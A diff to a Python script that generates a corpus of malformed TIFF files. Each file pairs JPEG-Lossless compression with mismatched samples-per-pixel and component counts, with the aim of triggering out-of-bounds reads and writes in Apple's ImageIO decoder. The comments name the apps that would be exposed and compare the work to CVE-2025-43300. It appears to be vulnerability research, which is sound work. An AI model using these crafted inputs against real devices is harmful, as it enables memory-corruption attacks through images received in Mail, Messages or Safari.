@@ -541,35 +541,43 @@ def generate_corpus(outdir='corpus'):
         print(f'    {fname}  ({len(data)} bytes)')
 
     # ---- Plain TIFF + JPEG-Lossless (PRIMARY ATTACK SURFACE) ----
-    # The TIFF plugin IS reachable (proven by uncompressed cases above).
-    # JPEG-Lossless is a valid TIFF compression (type 7).
-    # Mismatch between outer SPP and inner Nf should trigger OOB in the TIFF
-    # JPEG-Lossless decoder — same bug class as CVE-2025-43300.
+    # The TIFF JPEG-Lossless decode path IS reachable (proven by 16-bit run:
+    # "Unable to write image" = decode succeeded, PNG export failed for 16-bit).
+    # Using 8-bit so sips can export to PNG — this lets us see if decode crashes.
     #
     # Attack surface: any TIFF file processed by ImageIO (Mail, Messages, Photos,
     # Safari image preview, etc.). Not limited to DNG/Camera Raw path.
     tiff_jpegl_cases = [
-        # CTRL: SPP == Nf (should decode cleanly, confirms codec path is reached)
+        # --- 8-bit: CTRL (SPP == Nf) — MUST return rc=0 to confirm codec path ---
+        ('CTRL_tiff_jpegl_3spp_3nf_8b',
+         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
+        ('CTRL_tiff_jpegl_1spp_1nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        # --- 8-bit mismatch: Nf < SPP (OOB read direction, SPP controls loop) ---
+        ('tiff_jpegl_3spp_1nf_8b',
+         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        ('tiff_jpegl_3spp_2nf_8b',
+         build_plain_tiff(64, 64, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=2)),
+        ('tiff_jpegl_4spp_1nf_8b',
+         build_plain_tiff(64, 64, spp=4, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        ('tiff_jpegl_3spp_1nf_8b_256',
+         build_plain_tiff(256, 256, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        ('tiff_jpegl_3spp_1nf_8b_512',
+         build_plain_tiff(512, 512, spp=3, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
+        # --- 8-bit mismatch: Nf > SPP (OOB write direction, buffer too small) ---
+        ('tiff_jpegl_1spp_3nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
+        ('tiff_jpegl_1spp_4nf_8b',
+         build_plain_tiff(64, 64, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=4)),
+        ('tiff_jpegl_1spp_3nf_8b_256',
+         build_plain_tiff(256, 256, spp=1, bits=8, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
+        # --- 16-bit retained for reference (decode succeeds but PNG export fails) ---
         ('CTRL_tiff_jpegl_3spp_3nf_16b',
          build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
-        ('CTRL_tiff_jpegl_1spp_1nf_16b',
-         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
-        # Mismatch: Nf < SPP (inner reads fewer components than outer expects)
         ('tiff_jpegl_3spp_1nf_16b',
          build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
-        ('tiff_jpegl_3spp_2nf_16b',
-         build_plain_tiff(64, 64, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=2)),
-        ('tiff_jpegl_4spp_1nf_16b',
-         build_plain_tiff(64, 64, spp=4, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
-        ('tiff_jpegl_3spp_1nf_16b_256',
-         build_plain_tiff(256, 256, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
-        ('tiff_jpegl_3spp_1nf_16b_512',
-         build_plain_tiff(512, 512, spp=3, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=1)),
-        # Mismatch: Nf > SPP (inner writes more components than buffer holds — OOB write)
         ('tiff_jpegl_1spp_3nf_16b',
          build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=3)),
-        ('tiff_jpegl_1spp_4nf_16b',
-         build_plain_tiff(64, 64, spp=1, bits=16, codec=COMP_JPEG_LOSSLESS, inner_comps=4)),
     ]
     print('\n[*] Plain TIFF + JPEG-Lossless mismatch targets:')
     for name, data in tiff_jpegl_cases:
